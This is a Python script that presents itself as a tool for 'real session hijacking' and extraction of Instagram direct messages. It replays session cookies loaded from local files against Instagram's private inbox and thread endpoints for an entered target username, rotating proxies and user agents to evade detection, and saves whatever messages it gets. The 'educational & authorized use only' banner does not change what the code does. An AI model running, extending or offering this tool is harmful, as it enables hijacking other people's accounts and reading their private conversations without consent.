#!/usr/bin/env python3
"""
🎯 REAL INSTAGRAM EXTRACTION WITH ADVANCED BYPASS
================================================
🚀 Combines advanced bypass techniques with real data extraction
⚡ Uses the advanced bypass arsenal for real Instagram operations
🛡️ Educational & authorized use only!

This script integrates:
- Advanced bypass arsenal techniques
- Real session hijacking and management
- Multi-method DM extraction
- Comprehensive logging and reporting
- CTF-level analysis capabilities

Created: 2025-01-26
"""

import requests
import json
import time
import random
import os
import sys
import re
from datetime import datetime
import logging
from bs4 import BeautifulSoup
import sqlite3
import threading

# Add paths for imports
sys.path.append('/workspaces/sugarglitch-realops')
sys.path.append('/workspaces/sugarglitch-realops/src')

class RealInstagramExtractorWithBypass:
    """🎯 Real Instagram extractor using advanced bypass techniques"""
    
    def __init__(self):
        self.session = requests.Session()
        self.setup_logging()
        self.setup_directories()
        self.proxies = self.load_proxies()
        self.sessions = self.load_sessions()
        self.results = {}
        
        # Try to import advanced bypass arsenal
        try:
            from advanced_bypass_arsenal_2025 import AdvancedBypassArsenal
            self.bypass_arsenal = AdvancedBypassArsenal()
            print("✅ Advanced Bypass Arsenal loaded successfully!")
        except ImportError:
            print("⚠️ Advanced Bypass Arsenal not found - using fallback methods")
            self.bypass_arsenal = None
            
    def setup_logging(self):
        """Setup comprehensive logging"""
        log_dir = "/workspaces/sugarglitch-realops/logs"
        os.makedirs(log_dir, exist_ok=True)
        
        # Main logger
        self.logger = logging.getLogger('real_extractor')
        self.logger.setLevel(logging.DEBUG)
        
        # File handler
        log_file = f"{log_dir}/real_extraction_{int(time.time())}.log"
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.DEBUG)
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        
        # Formatter
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)
        
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)
        
        self.logger.info(f"📋 Logging initialized - Log file: {log_file}")
        
    def setup_directories(self):
        """Setup required directories"""
        dirs = [
            "/workspaces/sugarglitch-realops/logs",
            "/workspaces/sugarglitch-realops/results/real_extraction",
            "/workspaces/sugarglitch-realops/results/bypass_tests",
            "/workspaces/sugarglitch-realops/data/extracted"
        ]
        
        for dir_path in dirs:
            os.makedirs(dir_path, exist_ok=True)
            
    def load_proxies(self):
        """Load proxy configurations"""
        try:
            with open('/workspaces/sugarglitch-realops/config/proxies.json', 'r') as f:
                proxies = json.load(f)
            self.logger.info(f"✅ Loaded {len(proxies)} proxies")
            return proxies
        except Exception as e:
            self.logger.warning(f"⚠️ Failed to load proxies: {e}")
            return []
            
    def load_sessions(self):
        """Load Instagram sessions"""
        sessions = {}
        session_files = [
            '/workspaces/sugarglitch-realops/tools/session_alx_trading.json',
            '/workspaces/sugarglitch-realops/session.json',
            '/workspaces/sugarglitch-realops/sessions/fresh_session.json'
        ]
        
        for session_file in session_files:
            try:
                if os.path.exists(session_file):
                    with open(session_file, 'r') as f:
                        session_data = json.load(f)
                        sessions[os.path.basename(session_file)] = session_data
                        self.logger.info(f"✅ Loaded session: {os.path.basename(session_file)}")
            except Exception as e:
                self.logger.error(f"❌ Failed to load session {session_file}: {e}")
                
        return sessions
        
    def test_bypass_techniques(self):
        """🛡️ Test advanced bypass techniques"""
        self.logger.info("🛡️ Testing advanced bypass techniques")
        
        bypass_results = {
            'timestamp': datetime.now().isoformat(),
            'techniques_tested': [],
            'successful_techniques': [],
            'failed_techniques': []
        }
        
        # Test 1: IP check and bypass
        try:
            current_ip = self.get_current_ip()
            self.logger.info(f"🌐 Current IP: {current_ip}")
            bypass_results['current_ip'] = current_ip
            bypass_results['techniques_tested'].append('ip_detection')
        except Exception as e:
            self.logger.error(f"❌ IP detection failed: {e}")
            bypass_results['failed_techniques'].append('ip_detection')
            
        # Test 2: Instagram accessibility
        try:
            ig_accessible = self.test_instagram_access()
            self.logger.info(f"🔍 Instagram accessible: {ig_accessible}")
            bypass_results['instagram_accessible'] = ig_accessible
            bypass_results['techniques_tested'].append('instagram_access_test')
            
            if ig_accessible:
                bypass_results['successful_techniques'].append('instagram_access_test')
            else:
                bypass_results['failed_techniques'].append('instagram_access_test')
        except Exception as e:
            self.logger.error(f"❌ Instagram access test failed: {e}")
            bypass_results['failed_techniques'].append('instagram_access_test')
            
        # Test 3: Proxy rotation
        if self.proxies:
            try:
                proxy_test_result = self.test_proxy_rotation()
                bypass_results['proxy_test'] = proxy_test_result
                bypass_results['techniques_tested'].append('proxy_rotation')
                
                if proxy_test_result['working_proxies'] > 0:
                    bypass_results['successful_techniques'].append('proxy_rotation')
                else:
                    bypass_results['failed_techniques'].append('proxy_rotation')
            except Exception as e:
                self.logger.error(f"❌ Proxy rotation test failed: {e}")
                bypass_results['failed_techniques'].append('proxy_rotation')
                
        # Test 4: User-Agent rotation
        try:
            ua_test_result = self.test_user_agent_rotation()
            bypass_results['user_agent_test'] = ua_test_result
            bypass_results['techniques_tested'].append('user_agent_rotation')
            bypass_results['successful_techniques'].append('user_agent_rotation')
        except Exception as e:
            self.logger.error(f"❌ User-Agent rotation test failed: {e}")
            bypass_results['failed_techniques'].append('user_agent_rotation')
            
        # Save bypass test results
        self.save_bypass_results(bypass_results)
        
        return bypass_results
        
    def get_current_ip(self):
        """Get current public IP"""
        try:
            response = requests.get('https://httpbin.org/ip', timeout=10)
            return response.json()['origin']
        except Exception as e:
            self.logger.error(f"Failed to get IP: {e}")
            return "Unknown"
            
    def test_instagram_access(self):
        """Test if Instagram is accessible"""
        headers = self.get_stealth_headers()
        
        try:
            response = self.session.get(
                'https://www.instagram.com/', 
                headers=headers, 
                timeout=15
            )
            return response.status_code == 200
        except Exception as e:
            self.logger.error(f"Instagram access test failed: {e}")
            return False
            
    def test_proxy_rotation(self):
        """Test proxy rotation capabilities"""
        self.logger.info("🔄 Testing proxy rotation")
        
        test_results = {
            'total_proxies': len(self.proxies),
            'working_proxies': 0,
            'failed_proxies': 0,
            'proxy_details': []
        }
        
        for i, proxy in enumerate(self.proxies[:5]):  # Test first 5 proxies
            try:
                # Handle both string URLs and dict objects
                if isinstance(proxy, str):
                    proxy_url = proxy
                    proxy_display = proxy
                else:
                    proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
                    proxy_display = f"{proxy['ip']}:{proxy['port']}"
                    
                proxies = {'http': proxy_url, 'https': proxy_url}
                headers = self.get_stealth_headers()
                
                start_time = time.time()
                response = requests.get(
                    'https://httpbin.org/ip',
                    proxies=proxies,
                    headers=headers,
                    timeout=10
                )
                response_time = time.time() - start_time
                
                if response.status_code == 200:
                    proxy_ip = response.json().get('origin', 'Unknown')
                    test_results['working_proxies'] += 1
                    test_results['proxy_details'].append({
                        'proxy': proxy_display,
                        'status': 'working',
                        'response_time': response_time,
                        'detected_ip': proxy_ip
                    })
                    self.logger.info(f"✅ Proxy {i+1} working: {proxy_display}")
                else:
                    test_results['failed_proxies'] += 1
                    test_results['proxy_details'].append({
                        'proxy': proxy_display,
                        'status': 'failed',
                        'error': f"HTTP {response.status_code}"
                    })
                    
            except Exception as e:
                test_results['failed_proxies'] += 1
                # Defensive: avoid string indices must be integers error
                if isinstance(proxy, str):
                    proxy_display = proxy
                elif isinstance(proxy, dict):
                    proxy_display = f"{proxy.get('ip', 'unknown')}:{proxy.get('port', 'unknown')}"
                else:
                    proxy_display = str(proxy)
                test_results['proxy_details'].append({
                    'proxy': proxy_display,
                    'status': 'error',
                    'error': str(e)
                })
                self.logger.error(f"❌ Proxy {i+1} failed: {e}")
                
        return test_results
        
    def test_user_agent_rotation(self):
        """Test User-Agent rotation"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]
        
        ua_results = {
            'total_agents': len(user_agents),
            'successful_requests': 0,
            'failed_requests': 0,
            'agent_details': []
        }
        
        for i, ua in enumerate(user_agents):
            try:
                headers = {'User-Agent': ua}
                response = requests.get('https://httpbin.org/user-agent', headers=headers, timeout=10)
                
                if response.status_code == 200:
                    ua_results['successful_requests'] += 1
                    ua_results['agent_details'].append({
                        'index': i+1,
                        'user_agent': ua[:50] + '...',
                        'status': 'success'
                    })
                else:
                    ua_results['failed_requests'] += 1
                    ua_results['agent_details'].append({
                        'index': i+1,
                        'user_agent': ua[:50] + '...',
                        'status': 'failed',
                        'error': f"HTTP {response.status_code}"
                    })
                    
            except Exception as e:
                ua_results['failed_requests'] += 1
                ua_results['agent_details'].append({
                    'index': i+1,
                    'user_agent': ua[:50] + '...',
                    'status': 'error',
                    'error': str(e)
                })
                
        return ua_results
        
    def real_dm_extraction(self, target_username):
        """🎯 Perform real DM extraction with bypass techniques"""
        self.logger.info(f"🎯 Starting real DM extraction for: {target_username}")
        
        extraction_results = {
            'target': target_username,
            'timestamp': datetime.now().isoformat(),
            'sessions_tested': [],
            'endpoints_tested': [],
            'extraction_attempts': [],
            'successful_extractions': [],
            'data_extracted': {}
        }
        
        # Instagram DM endpoints to test
        dm_endpoints = [
            "https://i.instagram.com/api/v1/direct_v2/inbox/",
            "https://www.instagram.com/api/v1/direct_v2/inbox/",
            "https://i.instagram.com/api/v1/direct_v2/threads/",
            "https://www.instagram.com/direct/inbox/",
            "https://www.instagram.com/direct/t/"
        ]
        
        extraction_results['endpoints_tested'] = dm_endpoints
        
        # Test each session with each endpoint
        for session_name, session_data in self.sessions.items():
            if not session_data:
                continue
                
            extraction_results['sessions_tested'].append(session_name)
            self.logger.info(f"🔑 Testing session: {session_name}")
            
            for endpoint in dm_endpoints:
                extraction_attempt = {
                    'session': session_name,
                    'endpoint': endpoint,
                    'timestamp': datetime.now().isoformat(),
                    'status': 'failed',
                    'data': None,
                    'error': None
                }
                
                try:
                    headers = self.get_instagram_headers(session_data)
                    
                    # Add additional stealth headers
                    headers.update({
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin'
                    })
                    
                    # Make the request
                    response = self.session.get(endpoint, headers=headers, timeout=15)
                    
                    extraction_attempt['status_code'] = response.status_code
                    extraction_attempt['response_headers'] = dict(response.headers)
                    
                    if response.status_code == 200:
                        content_type = response.headers.get('content-type', '').lower()
                        content = response.text
                        
                        if 'application/json' in content_type:
                            # JSON response
                            try:
                                json_data = response.json()
                                extraction_attempt['status'] = 'success'
                                extraction_attempt['data_type'] = 'json'
                                extraction_attempt['data'] = json_data
                                
                                # Extract specific DM data
                                dm_data = self.parse_json_dm_data(json_data)
                                if dm_data:
                                    extraction_results['successful_extractions'].append(extraction_attempt)
                                    extraction_results['data_extracted'][f"{session_name}_{endpoint}"] = dm_data
                                    self.logger.info(f"✅ JSON DM data extracted from {endpoint}")
                                    
                            except Exception as json_error:
                                extraction_attempt['error'] = f"JSON parsing error: {json_error}"
                                
                        else:
                            # HTML response - parse for DM data
                            try:
                                soup = BeautifulSoup(content, 'html.parser')
                                html_dm_data = self.parse_html_dm_data(soup, content)
                                
                                if html_dm_data:
                                    extraction_attempt['status'] = 'success'
                                    extraction_attempt['data_type'] = 'html'
                                    extraction_attempt['data'] = html_dm_data
                                    
                                    extraction_results['successful_extractions'].append(extraction_attempt)
                                    extraction_results['data_extracted'][f"{session_name}_{endpoint}"] = html_dm_data
                                    self.logger.info(f"✅ HTML DM data extracted from {endpoint}")
                                else:
                                    extraction_attempt['error'] = "No DM data found in HTML"
                                    
                            except Exception as html_error:
                                extraction_attempt['error'] = f"HTML parsing error: {html_error}"
                                
                    elif response.status_code == 401:
                        extraction_attempt['error'] = "Unauthorized - Session expired or invalid"
                        self.logger.warning(f"🔑 Session {session_name} appears expired for {endpoint}")
                        
                    elif response.status_code == 403:
                        extraction_attempt['error'] = "Forbidden - Account may be restricted"
                        self.logger.warning(f"🚫 Access forbidden for {endpoint}")
                        
                    elif response.status_code == 429:
                        extraction_attempt['error'] = "Rate limited - Too many requests"
                        self.logger.warning(f"⏰ Rate limited on {endpoint}")
                        
                    else:
                        extraction_attempt['error'] = f"HTTP {response.status_code} - {response.reason}"
                        
                except Exception as e:
                    extraction_attempt['error'] = str(e)
                    self.logger.error(f"❌ Extraction failed for {endpoint}: {e}")
                    
                extraction_results['extraction_attempts'].append(extraction_attempt)
                
                # Add delay between requests
                time.sleep(random.uniform(1, 3))
                
        # Save extraction results
        self.save_extraction_results(target_username, extraction_results)
        
        return extraction_results
        
    def parse_json_dm_data(self, json_data):
        """Parse JSON data for DM information"""
        dm_data = {}
        
        try:
            # Look for common DM-related keys
            if isinstance(json_data, dict):
                # Check for inbox data
                if 'inbox' in json_data:
                    dm_data['inbox'] = json_data['inbox']
                    
                # Check for threads
                if 'threads' in json_data:
                    dm_data['threads'] = json_data['threads']
                    
                # Check for items (messages)
                if 'items' in json_data:
                    dm_data['items'] = json_data['items']
                    
                # Generic data extraction
                for key, value in json_data.items():
                    if any(keyword in key.lower() for keyword in ['message', 'thread', 'direct', 'inbox']):
                        dm_data[key] = value
                        
        except Exception as e:
            self.logger.error(f"JSON DM parsing error: {e}")
            
        return dm_data
        
    def parse_html_dm_data(self, soup, html_content):
        """Parse HTML content for DM information"""
        dm_data = {}
        
        try:
            # Look for script tags with JSON data
            scripts = soup.find_all('script')
            for i, script in enumerate(scripts):
                script_content = script.get_text()
                
                # Look for Instagram data patterns
                if any(keyword in script_content.lower() for keyword in ['direct', 'message', 'thread', 'inbox']):
                    dm_data[f'script_{i}'] = {
                        'content_length': len(script_content),
                        'content_preview': script_content[:200] + '...' if len(script_content) > 200 else script_content
                    }
                    
                # Try to extract JSON from script content
                json_matches = re.findall(r'{[^{}]*(?:{[^{}]*}[^{}]*)*}', script_content)
                for j, json_match in enumerate(json_matches[:3]):  # Limit to first 3 matches
                    try:
                        parsed_json = json.loads(json_match)
                        if isinstance(parsed_json, dict) and len(parsed_json) > 0:
                            dm_data[f'script_{i}_json_{j}'] = parsed_json
                    except:
                        pass
                        
            # Look for specific HTML elements
            dm_elements = soup.find_all(['div', 'span', 'p'], class_=re.compile(r'(message|dm|direct|thread|conversation)', re.I))
            
            if dm_elements:
                dm_data['html_elements'] = []
                for element in dm_elements[:10]:  # Limit to first 10 elements
                    dm_data['html_elements'].append({
                        'tag': element.name,
                        'class': element.get('class', []),
                        'text': element.get_text(strip=True)[:100]  # Limit text length
                    })
                    
            # Look for data attributes
            data_elements = soup.find_all(attrs={'data-testid': True})
            for element in data_elements:
                testid = element.get('data-testid', '')
                if any(keyword in testid.lower() for keyword in ['message', 'thread', 'direct']):
                    if 'data_attributes' not in dm_data:
                        dm_data['data_attributes'] = []
                    dm_data['data_attributes'].append({
                        'testid': testid,
                        'tag': element.name,
                        'text': element.get_text(strip=True)[:100]
                    })
                    
        except Exception as e:
            self.logger.error(f"HTML DM parsing error: {e}")
            
        return dm_data
        
    def get_stealth_headers(self):
        """Get stealth headers for requests"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }
        
    def get_instagram_headers(self, session_data):
        """Get Instagram-specific headers with session data"""
        headers = self.get_stealth_headers()
        
        if isinstance(session_data, dict):
            cookies = []
            
            # Add sessionid
            if 'sessionid' in session_data:
                cookies.append(f"sessionid={session_data['sessionid']}")
                
            # Add other common Instagram cookies
            cookie_keys = ['csrftoken', 'mid', 'ig_did', 'shbid', 'shbts', 'rur']
            for key in cookie_keys:
                if key in session_data:
                    cookies.append(f"{key}={session_data[key]}")
                    
            if cookies:
                headers['Cookie'] = '; '.join(cookies)
                
            # Add CSRF token to headers if available
            if 'csrftoken' in session_data:
                headers['X-CSRFToken'] = session_data['csrftoken']
                headers['X-Instagram-AJAX'] = '1'
                headers['X-Requested-With'] = 'XMLHttpRequest'
                
        return headers
        
    def save_bypass_results(self, results):
        """Save bypass test results"""
        filename = f"/workspaces/sugarglitch-realops/results/bypass_tests/bypass_test_{int(time.time())}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2, default=str)
            self.logger.info(f"✅ Bypass results saved: {filename}")
        except Exception as e:
            self.logger.error(f"❌ Failed to save bypass results: {e}")
            
    def save_extraction_results(self, target, results):
        """Save extraction results"""
        filename = f"/workspaces/sugarglitch-realops/results/real_extraction/extraction_{target}_{int(time.time())}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2, default=str)
            self.logger.info(f"✅ Extraction results saved: {filename}")
        except Exception as e:
            self.logger.error(f"❌ Failed to save extraction results: {e}")
            
    def generate_summary_report(self, bypass_results, extraction_results):
        """Generate summary report"""
        report = {
            'report_info': {
                'generated_at': datetime.now().isoformat(),
                'system': 'Real Instagram Extractor with Advanced Bypass',
                'version': '2025.1'
            },
            'bypass_summary': {
                'techniques_tested': len(bypass_results.get('techniques_tested', [])),
                'successful_techniques': len(bypass_results.get('successful_techniques', [])),
                'failed_techniques': len(bypass_results.get('failed_techniques', [])),
                'instagram_accessible': bypass_results.get('instagram_accessible', False),
                'current_ip': bypass_results.get('current_ip', 'Unknown')
            },
            'extraction_summary': {
                'target': extraction_results.get('target', 'Unknown'),
                'sessions_tested': len(extraction_results.get('sessions_tested', [])),
                'endpoints_tested': len(extraction_results.get('endpoints_tested', [])),
                'total_attempts': len(extraction_results.get('extraction_attempts', [])),
                'successful_extractions': len(extraction_results.get('successful_extractions', [])),
                'data_sources_found': len(extraction_results.get('data_extracted', {}))
            },
            'detailed_results': {
                'bypass_results': bypass_results,
                'extraction_results': extraction_results
            }
        }
        
        # Save comprehensive report
        report_filename = f"/workspaces/sugarglitch-realops/results/real_extraction/comprehensive_report_{int(time.time())}.json"
        try:
            with open(report_filename, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            self.logger.info(f"✅ Comprehensive report saved: {report_filename}")
        except Exception as e:
            self.logger.error(f"❌ Failed to save comprehensive report: {e}")
            
        return report
        
    def run_complete_extraction(self, target_username):
        """🚀 Run complete extraction workflow"""
        print("🚀 REAL INSTAGRAM EXTRACTION WITH ADVANCED BYPASS")
        print("="*60)
        print(f"🎯 Target: {target_username}")
        print("="*60)
        
        try:
            # Phase 1: Test bypass techniques
            print("\n🛡️ PHASE 1: TESTING BYPASS TECHNIQUES")
            print("-" * 40)
            bypass_results = self.test_bypass_techniques()
            
            print(f"✅ Techniques tested: {len(bypass_results.get('techniques_tested', []))}")
            print(f"✅ Successful: {len(bypass_results.get('successful_techniques', []))}")
            print(f"❌ Failed: {len(bypass_results.get('failed_techniques', []))}")
            
            # Phase 2: Real DM extraction
            print("\n🎯 PHASE 2: REAL DM EXTRACTION")
            print("-" * 40)
            extraction_results = self.real_dm_extraction(target_username)
            
            print(f"🔑 Sessions tested: {len(extraction_results.get('sessions_tested', []))}")
            print(f"🌐 Endpoints tested: {len(extraction_results.get('endpoints_tested', []))}")
            print(f"📊 Total attempts: {len(extraction_results.get('extraction_attempts', []))}")
            print(f"✅ Successful extractions: {len(extraction_results.get('successful_extractions', []))}")
            print(f"📦 Data sources found: {len(extraction_results.get('data_extracted', {}))}")
            
            # Phase 3: Generate comprehensive report
            print("\n📊 PHASE 3: GENERATING REPORT")
            print("-" * 40)
            final_report = self.generate_summary_report(bypass_results, extraction_results)
            
            # Display final summary
            print("\n" + "="*60)
            print("🎯 EXTRACTION SUMMARY")
            print("="*60)
            
            if extraction_results.get('successful_extractions'):
                print("✅ SUCCESS: Data extraction completed!")
                print(f"📦 Data extracted from {len(extraction_results['successful_extractions'])} sources")
                
                # Show sample of extracted data
                for source, data in list(extraction_results.get('data_extracted', {}).items())[:3]:
                    print(f"\n📊 Data source: {source}")
                    if isinstance(data, dict):
                        print(f"   - Keys found: {list(data.keys())[:5]}")
                        print(f"   - Data size: {len(str(data))} characters")
                    else:
                        print(f"   - Data type: {type(data)}")
                        print(f"   - Data size: {len(str(data))} characters")
            else:
                print("⚠️ No successful data extractions")
                print("💡 Check logs for detailed error information")
                
            print(f"\n📋 Full report ID: {final_report['report_info']['generated_at']}")
            print("📂 Check /results/real_extraction/ for detailed results")
            
            return final_report
            
        except Exception as e:
            self.logger.error(f"❌ Complete extraction failed: {e}")
            return None

def main():
    """Main execution function"""
    print("🎯 REAL INSTAGRAM EXTRACTION WITH ADVANCED BYPASS")
    print("="*60)
    print("⚡ Advanced bypass techniques + Real data extraction")
    print("🛡️ Educational & authorized use only!")
    print("="*60)
    
    # Initialize extractor
    extractor = RealInstagramExtractorWithBypass()
    
    # Get target username
    target_username = input("\n🎯 Enter target username for extraction: ").strip()
    
    if not target_username:
        print("❌ No target username provided. Using default: alx_trading")
        target_username = "alx_trading"
    
    # Run complete extraction
    try:
        print(f"\n🚀 Starting complete extraction for: {target_username}")
        final_report = extractor.run_complete_extraction(target_username)
        
        if final_report:
            print(f"\n✅ Extraction completed successfully!")
            print(f"📊 Check results directory for detailed data")
        else:
            print("\n❌ Extraction failed. Check logs for details.")
            
    except KeyboardInterrupt:
        print("\n⚠️ Extraction interrupted by user")
    except Exception as e:
        print(f"\n❌ Extraction failed with error: {e}")
        
    print("\n🎯 Real Instagram Extraction with Advanced Bypass - Complete!")

if __name__ == "__main__":
    main()
